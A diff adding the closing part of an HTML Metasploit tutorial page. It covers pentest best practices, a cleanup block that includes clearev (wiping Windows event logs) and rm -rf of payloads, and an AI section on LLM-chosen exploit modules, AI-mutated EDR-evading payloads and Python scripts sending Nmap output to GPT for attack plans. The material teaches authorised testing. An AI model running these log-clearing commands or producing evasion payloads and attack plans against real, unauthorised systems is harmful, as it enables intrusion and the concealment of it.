+      <li><span class="chk-i"></span><span><strong>Route through VPN or lab network</strong> — never run Metasploit modules directly from your personal internet connection; use a dedicated VPS or VPN endpoint to separate your identity from engagement activity</span></li>
+      <li><span class="chk-i"></span><span><strong>Clean up after testing</strong> — kill all sessions, remove persistence mechanisms, delete uploaded payloads, and clear the database loot directory after completing the engagement</span></li>
+      <li><span class="chk-i"></span><span><strong>Combine tools strategically</strong> — Metasploit is most powerful when used alongside Nmap (service discovery), Nikto (web scanning), Burp Suite (web application testing), and BloodHound (AD attack path mapping)</span></li>
+      <li><span class="chk-i"></span><span><strong>Document every action</strong> — log all commands executed, session IDs, timestamps, and output for the final penetration test report. Use MSF's built-in logging with <code style="color:var(--c);font-family:var(--mono)">spool /path/to/logfile</code></span></li>
+      <li><span class="chk-i"></span><span><strong>Prioritise lab practice</strong> — build a home lab with intentionally vulnerable VMs (Metasploitable2/3, HackTheBox, TryHackMe, VulnHub) and practise every workflow before using it in a client engagement</span></li>
+    </ul>
+  </div>
+
+  <div class="cb rv" data-l="Cleanup — Removing Evidence After Engagement">
+    <code><span class="cmt"># In Meterpreter — clean up before disconnecting</span>
+<span class="cmd">clearev</span>                         <span class="cmt"># Clear Windows Application, System, Security event logs</span>
+<span class="cmd">cd</span> %TEMP% && <span class="cmd">rm</span> -rf payload*   <span class="cmt"># Remove uploaded payload files</span>
+
+<span class="cmt"># In msfconsole — session and workspace cleanup</span>
+<span class="cmd">sessions</span> <span class="flag">-K</span>                    <span class="cmt"># Kill ALL active sessions</span>
+<span class="cmd">jobs</span> <span class="flag">-K</span>                        <span class="cmt"># Kill ALL background jobs (handlers)</span>
+
+<span class="cmt"># Remove local MSF loot, stored credentials, and logs</span>
+<span class="cmd">rm</span> <span class="flag">-rf</span> ~/.msf4/loot/*
+<span class="cmd">rm</span> <span class="flag">-rf</span> ~/.msf4/logs/*
+
+<span class="cmt"># Enable console logging for the engagement (run at start, not end)</span>
+<span class="cmd">spool</span> /opt/engagements/client_2024/msf_session.log</code>
+  </div>
+</section>
+
+<!-- ══ AI DIVIDER ══ -->
+<div class="div div-ai"></div>
+
+<!-- ══════════════════════════════════
+     AI INTEGRATION
+══════════════════════════════════ -->
+<section class="sec rv sec-ai" id="ai">
+  <div class="sec-hd">
+    <span class="sec-n">10 //</span>
+    <h2 class="sec-t">AI Integration in Metasploit &amp; Exploitation Workflows<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel panel-ai rv-l">
+    <p>Artificial Intelligence is fundamentally changing how penetration testers use Metasploit and approach exploitation workflows. The traditionally manual and time-intensive phases — vulnerability research, module selection, payload customisation, evasion tuning, and post-exploitation triage — are all being accelerated by AI tools that compress expert knowledge into actionable recommendations. Understanding how AI integrates with the Metasploit workflow makes every practitioner more effective and every engagement more thorough.</p>
+    <p>On the defensive side, AI-powered endpoint detection and response (EDR) platforms have made generic Meterpreter payloads and known MSF exploit signatures instantly detectable — pushing the security community toward more sophisticated evasion techniques and reinforcing why understanding AI-driven defence is as important as mastering the offensive tools themselves.</p>
+  </div>
+
+  <div class="alert al-p rv">
+    <span class="al-ic">[ AI ]</span>
+    <p class="al-tx">AI models can analyse a target's Nmap scan output and automatically recommend the most relevant Metasploit modules, ranked by likelihood of success for that specific service version — replacing the manual process of searching ExploitDB, cross-referencing CVEs, and selecting modules from experience. This translates to faster, more comprehensive engagement coverage, particularly against large or unfamiliar target environments.</p>
+  </div>
+
+  <h3 style="font-family:var(--mono);font-size:11px;letter-spacing:3px;color:#bf00ff;text-transform:uppercase;margin:28px 0 16px;">AI-Powered Offensive MSF Capabilities</h3>
+  <div class="ai-grid rv">
+    <div class="ai-card">
+      <span class="ai-ico">🎯</span>
+      <div class="ai-name">Intelligent Module Selection</div>
+      <div class="ai-desc">LLMs cross-reference discovered service versions, OS fingerprints, and open port combinations against the full Metasploit module library and public CVE databases — instantly recommending the highest-probability exploit modules for a given target, ranked by reliability rating, CVSSv3 score, and known exploit stability. Eliminates time wasted on incompatible or outdated module choices.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-ico">⚗️</span>
+      <div class="ai-name">AI Payload Customisation</div>
+      <div class="ai-desc">AI analyses the target environment — OS architecture, installed security software, network egress restrictions, and available ports — to recommend the optimal payload type and configuration. For example, automatically selecting <code style="color:var(--c);font-family:var(--mono)">reverse_https</code> over <code style="color:var(--c);font-family:var(--mono)">reverse_tcp</code> when outbound HTTPS is the only permitted egress, or recommending process injection targets that blend with normal system activity.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-ico">🕶</span>
+      <div class="ai-name">Adaptive EDR Evasion</div>
+      <div class="ai-desc">AI models generate novel payload variants — custom shellcode loaders, reflective DLL injection techniques, and in-memory execution chains — specifically tuned to evade the behavioural signatures of the EDR product detected on the target. Rather than relying on known-bad Meterpreter patterns that all EDRs detect, AI iteratively mutates the payload until it passes detection, enabling realistic simulation of advanced threat actor capabilities.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-ico">🗺</span>
+      <div class="ai-name">Post-Exploitation Path Planning</div>
+      <div class="ai-desc">After initial access, AI analyses the compromised system's role, network position, and available post-exploitation data to recommend the optimal sequence of post-exploitation modules — suggesting which privilege escalation technique to attempt first, which credential dumps are most likely to succeed, and which lateral movement paths lead most directly to the highest-value targets in the engagement scope.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-ico">🔄</span>
+      <div class="ai-name">Automated Session Management</div>
+      <div class="ai-desc">AI-driven agent frameworks manage multiple concurrent Meterpreter sessions autonomously — automatically running situational awareness commands on new sessions, backgrounding stable sessions, upgrading shell sessions to Meterpreter, and routing subsequent exploitation through optimal pivot sessions — freeing the tester to focus on strategic decisions rather than session housekeeping.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-ico">📝</span>
+      <div class="ai-name">Automated Engagement Reporting</div>
+      <div class="ai-desc">LLMs process MSF workspace data — discovered hosts, exploited vulnerabilities, captured credentials, session logs — and generate structured penetration test findings complete with CVSSv3 scores, MITRE ATT&amp;CK TTP mappings, business impact narratives, and developer-actionable remediation steps. Eliminates the post-engagement reporting bottleneck that typically consumes 30–50% of total engagement time.</div>
+    </div>
+  </div>
+
+  <h3 style="font-family:var(--mono);font-size:11px;letter-spacing:3px;color:#bf00ff;text-transform:uppercase;margin:32px 0 16px;">AI-Powered Defence Against MSF-Based Attacks</h3>
+  <div class="ai-grid rv">
+    <div class="ai-card">
+      <span class="ai-ico">🛡</span>
+      <div class="ai-name">Behavioural EDR Detection</div>
+      <div class="ai-desc">Modern EDR platforms (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne) use ML models trained on millions of attack sequences to detect Meterpreter behaviour at the process and memory level — recognising reflective DLL injection patterns, in-memory shellcode execution, LSASS access, and suspicious API call sequences entirely independently of file signatures. Generic MSF payloads are detected within seconds.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-ico">🔍</span>
+      <div class="ai-name">Network Traffic Analysis</div>
+      <div class="ai-desc">ML models analyse network flow data to detect Meterpreter C2 communication patterns — even when encrypted over HTTPS. Beacon timing regularity, packet size distributions, connection persistence anomalies, and unusual process-to-network associations all produce signatures that AI-driven NDR platforms flag as potential C2 activity, regardless of the encryption layer.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-ico">🧠</span>
+      <div class="ai-name">AI-Powered SIEM Correlation</div>
+      <div class="ai-desc">AI correlation engines in modern SIEM platforms (Microsoft Sentinel with Copilot, Splunk with AI-driven alerts) automatically connect exploit activity indicators across multiple event sources — correlating a failed authentication on one host, a new process creation on another, and unusual outbound traffic on a third into a unified attack story that rule-based correlation would never assemble.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-ico">🚨</span>
+      <div class="ai-name">Automated Threat Hunting</div>
+      <div class="ai-desc">AI threat hunting tools proactively search for indicators of Metasploit-based compromise across endpoint telemetry — scanning for known Meterpreter memory signatures, suspicious Sysmon process creation chains, anomalous PowerShell execution, and encoded command-line arguments that match MSF staging patterns — detecting threats that evade real-time alerts by operating below individual detection thresholds.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-ico">⚡</span>
+      <div class="ai-name">Automated Incident Response</div>
+      <div class="ai-desc">AI-driven SOAR platforms respond automatically to confirmed Metasploit-based attack indicators — isolating the compromised host, terminating suspicious processes, revoking active sessions, blocking C2 IP ranges at the firewall, capturing forensic memory dumps, and notifying the SOC with a pre-built attack timeline — all within seconds of detection, before lateral movement can begin.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-ico">🔮</span>
+      <div class="ai-name">Vulnerability Prioritisation</div>
+      <div class="ai-desc">AI models analyse the organisation's full vulnerability inventory and cross-reference it against real-time threat intelligence — identifying which vulnerabilities have working Metasploit modules, active exploitation in the wild, and the highest potential impact given the organisation's specific network topology. Enables risk-based patching that neutralises the most MSF-accessible attack paths first.</div>
+    </div>
+  </div>
+
+  <div class="panel panel-ai rv" style="margin-top:28px">
+    <div class="panel-t">AI Tools for MSF-Enhanced Penetration Testing</div>
+    <table style="width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12px;margin:8px 0">
+      <thead><tr>
+        <th style="text-align:left;padding:10px 14px;color:#bf00ff;border-bottom:1px solid rgba(191,0,255,.25);letter-spacing:2px;font-size:10px;text-transform:uppercase">Tool</th>
+        <th style="text-align:left;padding:10px 14px;color:#bf00ff;border-bottom:1px solid rgba(191,0,255,.25);letter-spacing:2px;font-size:10px;text-transform:uppercase">AI Capability</th>
+        <th style="text-align:left;padding:10px 14px;color:#bf00ff;border-bottom:1px solid rgba(191,0,255,.25);letter-spacing:2px;font-size:10px;text-transform:uppercase">MSF Workflow Use Case</th>
+      </tr></thead>
+      <tbody>
+        <tr><td style="padding:9px 14px;color:var(--g);border-bottom:1px solid rgba(0,255,65,.05);font-weight:700">GPT-4 / Claude</td><td style="padding:9px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05)">Module selection &amp; payload advice</td><td style="padding:9px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05)">Feed Nmap output → AI recommends best MSF modules, payload type, and LHOST config for each service</td></tr>
+        <tr><td style="padding:9px 14px;color:var(--g);border-bottom:1px solid rgba(0,255,65,.05);font-weight:700">PentestGPT</td><td style="padding:9px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05)">LLM-guided pentest workflow</td><td style="padding:9px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05)">Step-by-step MSF exploitation guidance, post-exploitation suggestions, and finding documentation</td></tr>
+        <tr><td style="padding:9px 14px;color:var(--g);border-bottom:1px solid rgba(0,255,65,.05);font-weight:700">Metasploit Pro</td><td style="padding:9px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05)">Automated exploitation &amp; reporting</td><td style="padding:9px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05)">Commercial MSF tier with AI-assisted attack chaining and automated report generation</td></tr>
+        <tr><td style="padding:9px 14px;color:var(--g);border-bottom:1px solid rgba(0,255,65,.05);font-weight:700">CrowdStrike Falcon</td><td style="padding:9px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05)">ML behavioural EDR</td><td style="padding:9px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05)">Detects Meterpreter injection, LSASS access, and MSF staging patterns in real time</td></tr>
+        <tr><td style="padding:9px 14px;color:var(--g);border-bottom:1px solid rgba(0,255,65,.05);font-weight:700">Microsoft Sentinel + Copilot</td><td style="padding:9px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05)">LLM-powered SIEM correlation</td><td style="padding:9px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05)">Natural-language threat hunting for MSF-based attack indicators across all telemetry sources</td></tr>
+        <tr><td style="padding:9px 14px;color:var(--g);font-weight:700">Nuclei + AI templates</td><td style="padding:9px 14px;color:var(--t2)">AI-generated vulnerability templates</td><td style="padding:9px 14px;color:var(--t2)">Rapid pre-check templates for MSF-exploitable CVEs — confirm vulnerability before launching exploit</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="cb cb-ai rv" data-l="AI-Assisted — Nmap to MSF Module Recommendation (Python + GPT)">
+    <code><span class="cmt"># Feed Nmap scan output into GPT for intelligent MSF module selection</span>
+<span class="kw">import</span> openai, subprocess, json
+
+<span class="cmt"># Run Nmap scan against target</span>
+nmap_out = subprocess.<span class="fn">run</span>(
+    [<span class="str">'nmap'</span>,<span class="str">'-sV'</span>,<span class="str">'-T4'</span>,<span class="str">'--open'</span>,<span class="str">'-oJ'</span>,<span class="str">'-'</span>, <span class="prm">'&lt;TARGET-IP&gt;'</span>],
+    capture_output=<span class="kw">True</span>, text=<span class="kw">True</span>
+).stdout
+
+client = openai.<span class="fn">OpenAI</span>()
+response = client.chat.completions.<span class="fn">create</span>(
+    model=<span class="str">"gpt-4o"</span>,
+    messages=[{<span class="str">"role"</span>:<span class="str">"user"</span>, <span class="str">"content"</span>: <span class="str">f"""
+You are an expert Metasploit penetration tester on an authorised engagement.
+Analyse this Nmap scan output and provide a prioritised MSF attack plan:
+
+{nmap_out[:3000]}
+
+For each discovered service, provide:
+1. MSF MODULE PATH — exact use path (e.g. exploit/windows/smb/ms17_010_eternalblue)
+2. RELIABILITY — module reliability rating and why
+3. RECOMMENDED PAYLOAD — best payload for this target OS/arch
+4. REQUIRED OPTIONS — all set commands needed (RHOSTS, LHOST, LPORT, etc.)
+5. PRE-CHECK — Nmap NSE script or auxiliary module to confirm vulnerability safely
+6. DETECTION RISK — likelihood of triggering EDR/IDS and mitigation advice
+"""</span>}]
+)
+<span class="fn">print</span>(response.choices[<span class="num">0</span>].message.content)</code>
+  </div>
+
+  <div class="cb cb-ai rv" data-l="AI — Automated MSF Engagement Finding Generator">
+    <code><span class="cmt"># Convert MSF session evidence into a professional pentest finding</span>
+<span class="kw">import</span> openai, json
+
+finding = {
+    <span class="str">"exploit_module"</span>: <span class="str">"exploit/windows/smb/ms17_010_eternalblue"</span>,
+    <span class="str">"target"</span>: <span class="str">"192.168.1.50 — Windows Server 2008 R2 SP1 x64"</span>,
+    <span class="str">"payload"</span>: <span class="str">"windows/x64/meterpreter/reverse_tcp"</span>,
+    <span class="str">"result"</span>: <span class="str">"SYSTEM shell obtained — no credentials required"</span>,
+    <span class="str">"post_exploitation"</span>: <span class="str">"hashdump retrieved 47 NTLM hashes; domain joined; DC reachable"</span>,
+    <span class="str">"patch_status"</span>: <span class="str">"MS17-010 not applied — last patched March 2016"</span>
+}
+
+prompt = <span class="str">f"""
+As a senior penetration tester, write a complete engagement finding:
+{json.dumps(finding, indent=2)}
+
+Include: Title, CVSSv3 score and vector, Severity, Technical Description,
+Business Impact (lateral movement to DC, credential exposure, ransomware risk),
+Steps to Reproduce (exact MSF command sequence), Evidence summary,
+Remediation (specific patch KB, compensating controls), and MITRE ATT&CK TTPs.
+"""</span>
+
+r = openai.OpenAI().chat.completions.<span class="fn">create</span>(
+    model=<span class="str">"gpt-4o"</span>,
+    messages=[{<span class="str">"role"</span>:<span class="str">"user"</span>,<span class="str">"content"</span>:prompt}]
+)
+<span class="fn">print</span>(r.choices[<span class="num">0</span>].message.content)</code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══ CTA ══ -->
+<div class="cta rv">
+  <div class="cta-t">// Know Your Tools. Master Your Craft. //</div>
+  <p class="cta-p">Metasploit is not a point-and-click hacking tool — it is a professional framework that rewards deep understanding. Build a home lab with Metasploitable2/3, work through every module type systematically, and develop the instinct to know which module to reach for in any situation. Mastery comes from repetition in controlled environments, not from shortcuts.</p>
+  <div class="cta-btns">
+    <a href="https://github.com/nishu2402" class="btn btn-p" target="_blank" rel="noopener">GitHub — nishu2402</a>
+    <a href="https://nishu2402.github.io" class="btn btn-s" target="_blank" rel="noopener">View Portfolio</a>
+  </div>
+</div>
+
+<!-- ══ FOOTER ══ -->
+<footer class="footer">
+  <div class="f-l">
+    Nisarg Chasmawala (Shroff)<br>
+    <span class="f-alias">// HEAVEN</span>
+  </div>
+  <div class="f-r">
+    Offensive Security Engineer · MSc Cyber Security, BCU<br>
+    CEH Master · CPENT · CHFI · ISO 27001 Lead Auditor<br>
+    <a href="https://github.com/nishu2402" target="_blank" rel="noopener">github.com/nishu2402</a>
+  </div>
+</footer>
+
+</div>
+
+<script>
+/* ─── CURSOR ─── */
+const cur=document.getElementById('cur'),cur2=document.getElementById('cur2'),cur3=document.getElementById('cur3');
+let mx=0,my=0;
+document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;cur.style.left=mx+'px';cur.style.top=my+'px'});
+(function loop(){cur2.style.left=mx+'px';cur2.style.top=my+'px';cur3.style.left=mx+'px';cur3.style.top=my+'px';requestAnimationFrame(loop)})();
+document.querySelectorAll('a,.btn,.vc,.tc,.atk,.mpc,.panel,.cb').forEach(el=>{
+  el.addEventListener('mouseenter',()=>{cur.style.width='18px';cur.style.height='18px';cur.style.background='rgba(0,255,65,.25)'});
+  el.addEventListener('mouseleave',()=>{cur.style.width='10px';cur.style.height='10px';cur.style.background='var(--g)'});
+});
+
+/* ─── PROGRESS ─── */
+window.addEventListener('scroll',()=>{document.getElementById('prog').style.width=((window.scrollY/(document.body.scrollHeight-window.innerHeight))*100)+'%'});
+
+/* ═══ PARTICLE NETWORK ═══ */
+(function(){
+  const c=document.getElementById('bg-particle'),ctx=c.getContext('2d');
+  let W,H,mouseX=innerWidth/2,mouseY=innerHeight/2;
+  const N=200,MAX=140;let P=[];
+  class Particle{
+    constructor(){this.reset(true)}
+    reset(i){this.x=Math.random()*W;this.y=i?Math.random()*H:H+10;this.z=Math.random()*3+.5;this.vx=(Math.random()-.5)*.4;this.vy=(Math.random()-.5)*.4-.1;this.life=Math.random()*300+200;this.maxLife=this.life;this.r=Math.random()*1.5+.5;const r=Math.random();this.color=r<.7?'0,255,65':r<.9?'0,229,255':'191,0,255'}
+    update(){const dx=this.x-mouseX,dy=this.y-mouseY,d=Math.sqrt(dx*dx+dy*dy);if(d<120){const f=(120-d)/120;this.vx+=dx/d*f*.6;this.vy+=dy/d*f*.6}this.vx*=.98;this.vy*=.98;this.x+=this.vx;this.y+=this.vy;this.life--;if(this.life<=0||this.x<-50||this.x>W+50||this.y<-50||this.y>H+50)this.reset(false)}
+    draw(){const a=(this.life/this.maxLife)*.7*this.z;ctx.beginPath();ctx.arc(this.x,this.y,this.r*this.z,0,Math.PI*2);ctx.fillStyle=`rgba(${this.color},${a})`;ctx.fill()}
+  }
+  function resize(){W=c.width=innerWidth;H=c.height=innerHeight}
+  function drawLines(){for(let i=0;i<P.length;i++)for(let j=i+1;j<P.length;j++){const a=P[i],b=P[j],dx=a.x-b.x,dy=a.y-b.y,d=Math.sqrt(dx*dx+dy*dy);if(d<MAX){const al=(1-d/MAX)*.18,g=ctx.createLinearGradient(a.x,a.y,b.x,b.y);g.addColorStop(0,`rgba(${a.color},${al})`);g.addColorStop(1,`rgba(${b.color},${al})`);ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);ctx.strokeStyle=g;ctx.lineWidth=(a.z+b.z)/2*.5;ctx.stroke()}}}
+  function drawRing(){const g=ctx.createRadialGradient(mouseX,mouseY,0,mouseX,mouseY,80);g.addColorStop(0,'rgba(0,255,65,0)');g.addColorStop(.7,'rgba(0,255,65,0.04)');g.addColorStop(1,'rgba(0,255,65,0)');ctx.fillStyle=g;ctx.beginPath();ctx.arc(mouseX,mouseY,80,0,Math.PI*2);ctx.fill()}
+  function animate(){ctx.clearRect(0,0,W,H);drawRing();drawLines();P.forEach(p=>{p.update();p.draw()});requestAnimationFrame(animate)}
+  resize();window.addEventListener('resize',resize);document.addEventListener('mousemove',e=>{mouseX=e.clientX;mouseY=e.clientY});
+  P=Array.from({length:N},()=>new Particle());animate();
+})();
+
+/* ═══ HEX GRID ═══ */
+(function(){
+  const c=document.getElementById('bg-hex'),ctx=c.getContext('2d');
+  let W,H,t=0;const S=40;
+  function resize(){W=c.width=innerWidth;H=c.height=innerHeight}
+  function hexPath(cx,cy,s){ctx.beginPath();for(let i=0;i<6;i++){const a=Math.PI/180*(60*i-30);i===0?ctx.moveTo(cx+s*Math.cos(a),cy+s*Math.sin(a)):ctx.lineTo(cx+s*Math.cos(a),cy+s*Math.sin(a))}ctx.closePath()}
+  function draw(){ctx.clearRect(0,0,W,H);t+=.008;const sy=window.scrollY,cols=Math.ceil(W/(S*1.732))+2,rows=Math.ceil(H/(S*1.5))+2;for(let r=-1;r<rows;r++)for(let col=-1;col<cols;col++){const cx=col*S*1.732+(r%2)*S*.866,cy=r*S*1.5-(sy*.03)%((S*1.5));const w=Math.sin(t+col*.3+r*.2)*.5+.5,p=Math.sin(t*1.4+col*.5-r*.3)*.5+.5;hexPath(cx,cy,S-2);ctx.strokeStyle=`rgba(0,255,65,${.02+w*.07})`;ctx.lineWidth=.6;ctx.stroke();if(w>.92){hexPath(cx,cy,S-2);ctx.fillStyle=`rgba(0,255,65,${.02+p*.03})`;ctx.fill()}}requestAnimationFrame(draw)}
+  resize();window.addEventListener('resize',resize);draw();
+})();
+
+/* ═══ HERO 3D — TETRAHEDRON CLUSTER ═══ */
+(function(){
+  const c=document.getElementById('hero-geo');if(!c)return;
+  const ctx=c.getContext('2d'),S=500;c.width=S;c.height=S;
+
+  // Central tetrahedron
+  const R=120,h=R*Math.sqrt(2/3);
+  const baseR=R*Math.sqrt(2/3);
+  const coreVerts=[
+    [0, R*Math.sqrt(2/3)*0.75, 0],
+    [ baseR*Math.sin(0),        -h/3, baseR*Math.cos(0)],
+    [ baseR*Math.sin(2*Math.PI/3), -h/3, baseR*Math.cos(2*Math.PI/3)],
+    [ baseR*Math.sin(4*Math.PI/3), -h/3, baseR*Math.cos(4*Math.PI/3)]
+  ];
+  const coreEdges=[[0,1],[0,2],[0,3],[1,2],[2,3],[3,1]];
+
+  // 4 satellite tetrahedra — smaller, orbiting each face
+  const satellites=[];
+  const satR=50,offset=170;
+  const directions=[[0,1,0],[0,-1,0],[1,0,1],[-1,0,-1]];
+  directions.forEach((dir,di)=>{
+    const len=Math.sqrt(dir.reduce((s,v)=>s+v*v,0));
+    const nd=dir.map(v=>v/len*offset);
+    const sverts=[
+      [nd[0], nd[1]+satR*0.7, nd[2]],
+      [nd[0]+satR*Math.sin(0)*0.8, nd[1]-satR*0.3, nd[2]+satR*Math.cos(0)*0.8],
+      [nd[0]+satR*Math.sin(2.094)*0.8, nd[1]-satR*0.3, nd[2]+satR*Math.cos(2.094)*0.8],
+      [nd[0]+satR*Math.sin(4.189)*0.8, nd[1]-satR*0.3, nd[2]+satR*Math.cos(4.189)*0.8]
+    ];
+    satellites.push({verts:sverts,edges:[[0,1],[0,2],[0,3],[1,2],[2,3],[3,1]],col:['0,255,65','0,229,255','191,0,255','255,215,0'][di]});
+  });
+
+  // Connect core vertices to nearest satellite verts
+  let rx=0,ry=0,rz=0,mrx=0,mry=0;
+  document.addEventListener('mousemove',e=>{mrx=(e.clientY/innerHeight-.5)*.4;mry=(e.clientX/innerWidth-.5)*.5});
+
+  function rot([x,y,z],rx,ry,rz){
+    let y1=y*Math.cos(rx)-z*Math.sin(rx),z1=y*Math.sin(rx)+z*Math.cos(rx);
+    let x2=x*Math.cos(ry)+z1*Math.sin(ry),z2=-x*Math.sin(ry)+z1*Math.cos(ry);
+    let x3=x2*Math.cos(rz)-y1*Math.sin(rz),y3=x2*Math.sin(rz)+y1*Math.cos(rz);
+    return[x3,y3,z2];
+  }
+  function proj([x,y,z]){const f=420,d=f/(f+z+R*2);return[x*d+S/2,y*d+S/2,z]}
+
+  function drawShape(verts,edges,color,rx,ry,rz,alpha_boost=1){
+    const pv=verts.map(v=>proj(rot(v,rx,ry,rz)));
+    edges.forEach(([a,b])=>{
+      const pa=pv[a],pb=pv[b];
+      const dep=((pa[2]+pb[2])/(2*(R*2))+1)/2;
+      const al=(0.06+dep*.5)*alpha_boost;
+      const g=ctx.createLinearGradient(pa[0],pa[1],pb[0],pb[1]);
+      g.addColorStop(0,`rgba(${color},${al})`);g.addColorStop(1,`rgba(${color},${al*0.6})`);
+      ctx.beginPath();ctx.moveTo(pa[0],pa[1]);ctx.lineTo(pb[0],pb[1]);
+      ctx.strokeStyle=g;ctx.lineWidth=.5+dep*1.2;ctx.stroke();
+    });
+    pv.forEach(([px,py,pz])=>{
+      const d=(pz+R*2)/(4*R);if(d<.2)return;
+      ctx.beginPath();ctx.arc(px,py,d*2.5*alpha_boost,0,Math.PI*2);
+      ctx.fillStyle=`rgba(${color},${d*.9})`;ctx.fill();
+    });
+    return pv;
+  }
+
+  function draw(){
+    ctx.clearRect(0,0,S,S);
+    rx+=.005+mrx*.009;ry+=.008+mry*.011;rz+=.003;
+
+    // Draw satellites first (behind core)
+    satellites.forEach((sat,i)=>{
+      const sr=rx+i*0.8,sy2=ry-i*0.6,sz=rz+i*0.4;
+      const pv=drawShape(sat.verts,sat.edges,sat.col,sr,sy2,sz,0.7);
+      // Draw connector line from nearest core vert
+      const corePV=coreVerts.map(v=>proj(rot(v,rx,ry,rz)));
+      const satCenter=[
+        sat.verts.reduce((s,v)=>s+v[0],0)/4,
+        sat.verts.reduce((s,v)=>s+v[1],0)/4,
+        sat.verts.reduce((s,v)=>s+v[2],0)/4
+      ];
+      const sp=proj(rot(satCenter,sr,sy2,sz));
+      const cp=corePV[i%4];
+      ctx.beginPath();ctx.moveTo(sp[0],sp[1]);ctx.lineTo(cp[0],cp[1]);
+      ctx.strokeStyle=`rgba(${sat.col},0.12)`;ctx.lineWidth=.5;ctx.stroke();
+    });
+
+    // Draw core tetrahedron (brightest)
+    drawShape(coreVerts,coreEdges,'0,255,65',rx,ry,rz,1.4);
+
+    // Core glow
+    const g=ctx.createRadialGradient(S/2,S/2,0,S/2,S/2,60);
+    g.addColorStop(0,'rgba(0,255,65,0.09)');g.addColorStop(1,'rgba(0,255,65,0)');
+    ctx.fillStyle=g;ctx.beginPath();ctx.arc(S/2,S/2,60,0,Math.PI*2);ctx.fill();
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+
+/* ═══ 3D TILT ON MODULE CARDS ═══ */
+document.querySelectorAll('.vc').forEach(card=>{
+  card.addEventListener('mousemove',e=>{
+    const r=card.getBoundingClientRect(),x=(e.clientX-r.left)/r.width-.5,y=(e.clientY-r.top)/r.height-.5;
+    card.style.transform=`perspective(700px) rotateX(${-y*16}deg) rotateY(${x*16}deg) translateZ(12px) scale(1.03)`;
+    card.style.boxShadow=`${-x*24}px ${-y*24}px 50px rgba(191,0,255,.18),0 24px 60px rgba(0,0,0,.4)`;
+  });
+  card.addEventListener('mouseleave',()=>{
+    card.style.transform='perspective(700px) rotateX(0) rotateY(0) translateZ(0) scale(1)';
+    card.style.boxShadow='';card.style.transition='transform .4s,box-shadow .4s';
+    setTimeout(()=>card.style.transition='',400);
+  });
+});
+
+/* ═══ SCROLL REVEAL ═══ */
+const rv=new IntersectionObserver(e=>e.forEach(x=>{if(x.isIntersecting)x.target.classList.add('on')}),{threshold:.08});
+document.querySelectorAll('.rv,.rv-l,.rv-r').forEach(el=>rv.observe(el));
+
+/* ═══ TOC TRACKING ═══ */
+const sIds=['hero','what','architecture','setup','recon','exploit','post','payloads','evasion','ai'];
+const tItems=document.querySelectorAll('.toc-i');
+const so=new IntersectionObserver(e=>{e.forEach(x=>{if(x.isIntersecting)tItems.forEach(t=>t.classList.toggle('active',t.dataset.s===x.target.id))})},{threshold:.25});
+sIds.forEach(id=>{const el=document.getElementById(id);if(el)so.observe(el)});
+function goTo(h){document.querySelector(h)?.scrollIntoView({behavior:'smooth'})}
+
+/* ═══ CODE COPY ═══ */
+document.querySelectorAll('.cb').forEach(b=>{
+  b.title='Click to copy';
+  b.addEventListener('click',()=>{
+    navigator.clipboard.writeText(b.querySelector('code').innerText).catch(()=>{});
+    const o=b.getAttribute('data-l');b.setAttribute('data-l',o+' ✓ COPIED');
+    setTimeout(()=>b.setAttribute('data-l',o),2000);
+  });
+});
+</script>
+</body>
+</html>
